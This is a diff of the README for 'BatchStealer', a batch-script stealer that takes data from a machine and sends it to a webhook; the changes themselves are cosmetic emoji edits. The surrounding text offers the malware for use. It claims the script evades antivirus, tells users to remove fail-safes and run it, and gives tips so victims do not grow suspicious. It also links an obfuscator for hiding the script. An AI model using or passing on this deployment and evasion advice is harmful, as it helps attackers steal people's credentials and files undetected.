@@ -1,6 +1,6 @@
 # BatchStealer | [BatchStealer Example](https://github.com/Takaovi/BatchStealer-Example)
 
-### A batch script for taking things and sending them to a webhook
+### 📜 A batch script for taking things and sending them to a webhook 
 
 3.4.2021 < FUD [(Virustotal)](https://www.virustotal.com/gui/file/6dfc563da383268f927fd90834afe1f2b5757933ea7527029c94f5aa6ab08c0d/detection)
 
@@ -26,16 +26,16 @@
 2. Remove the fail-safes. ("goto xxx")
 3. Run the batch file.
 
-### Get rid of the comments
+### ❌ Get rid of the comments 📝
 * Do a regex search on notepad++, match `^::.*\n` and replace with nothing.
 
-### Avoid
+### ⛔ Avoid
 * Just changing the webhook and doing nothing else. 
   * If the batch file does nothing the user will open it to see what's wrong.
 
 # Features
 
-### Steals
+### 📨 Steals
 
 *Almost everything is encrypted, I haven't had the patience to do that on a batch file*
 
@@ -115,7 +115,7 @@
   * Save.dat
 </details>
 
-### Other features
+### 📑 Other features 
 
 <details>
   <summary>Other</summary>
@@ -130,15 +130,12 @@
     * Ability to target specific users (Check username)
 </details>
 
-
-
-
-# Support
+# 💡 Support
 
 * If you want to support the project do a pull request.
   * The pull request could be a new steal etc.
 
-# Obfuscation
+# ㊙️ Obfuscation
 * You can try [this](https://github.com/SkyEmie/batch-obfuscator)
   * Clean the file before obfuscating it, remove all the comments and the features you don't use. Make the file as small as possible.
 
